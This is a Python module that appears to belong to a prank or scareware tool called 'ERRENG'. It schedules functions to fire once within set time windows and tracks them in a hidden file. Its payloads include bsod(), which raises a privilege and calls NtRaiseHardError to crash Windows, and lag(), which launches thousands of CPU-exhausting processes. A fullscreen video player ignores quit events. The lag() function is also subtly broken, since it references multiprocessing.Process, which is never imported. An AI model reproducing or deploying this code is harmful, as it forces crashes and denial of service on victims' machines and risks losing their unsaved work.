import pygame
from moviepy.editor import VideoFileClip
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
from multiprocessing import Process
import asyncio, datetime, json, os, sys

os.chdir("C:\\Users\\Public\\ERRENG")

RUNAT_DATA_FILE = ".erreng_exec_data.json"
ERRENG_DATA_FILE = "data.json"

def _load_runat_exec():
    if os.path.exists(RUNAT_DATA_FILE):
        with open(RUNAT_DATA_FILE, "r") as file:
            return json.load(file)
    return {}
    
def _save_runat_exec(state):
    with open(RUNAT_DATA_FILE, "w") as file:
        json.dump(state, file)

runat_data = _load_runat_exec()

async def _runat(func, start_time, end_time):
    global runat_data

    now = datetime.datetime.now()
    start_time = datetime.datetime.strptime(start_time, "%d/%m/%y %H:%M:%S")
    end_time = datetime.datetime.strptime(end_time, "%d/%m/%y %H:%M:%S")
    
    func_name = func.__name__
    if runat_data.get(func_name):
        print(f"{func_name} has already been executed. Skipping.")
        return
    if now > end_time:
        print(f"End time for {func_name} has already passed. Function will not be executed.")
        return
    delay_until_start = (start_time - now).total_seconds()
    if delay_until_start > 0:
        await asyncio.sleep(delay_until_start)
    now = datetime.datetime.now()
    if start_time <= now <= end_time:
        print(f"Executing {func_name} at {now}")
        func()
        runat_data[func_name] = True
        _save_runat_exec(runat_data)
    else:
        print(f"{func_name} was not executed because it is not within the time window.")

async def _schedule(tasks):
    await asyncio.gather(*(_runat(func, start, end) for func, start, end in tasks))

def schedule(*tasks):
    asyncio.run(_schedule(tasks))

def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))

def play_audio(file):
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(file)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        pygame.time.Clock().tick(10)

def play_video(video_path):
    pygame.init()
    video = VideoFileClip(video_path)
    audio = video.audio
    audio.write_audiofile("temp_audio.wav")
    pygame.display.init()
    screen = pygame.display.set_mode(video.size, pygame.FULLSCREEN)
    clock = pygame.time.Clock()
    audio_start_time = pygame.mixer.music.get_pos()
    pygame.mixer.music.load("temp_audio.wav")
    pygame.mixer.music.play(start=audio_start_time / 1000)
    for frame in video.iter_frames(fps=video.fps):
        pygame_frame = pygame.image.frombuffer(frame.tobytes(), video.size, 'RGB')
        screen.blit(pygame_frame, (0, 0))
        pygame.display.flip()
        clock.tick(video.fps)
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass
        if not pygame.mixer.music.get_busy():
            break
    pygame.mixer.music.stop()
    pygame.quit()

def _work():
    x = 99999
    while True:
        x **= x
        print(x)

def lag(x=10000):
    for _ in range(x):
        p = multiprocessing.Process(target=_work)
        p.start()

def getID():
    return json.load(open("data.json"))["ID"]
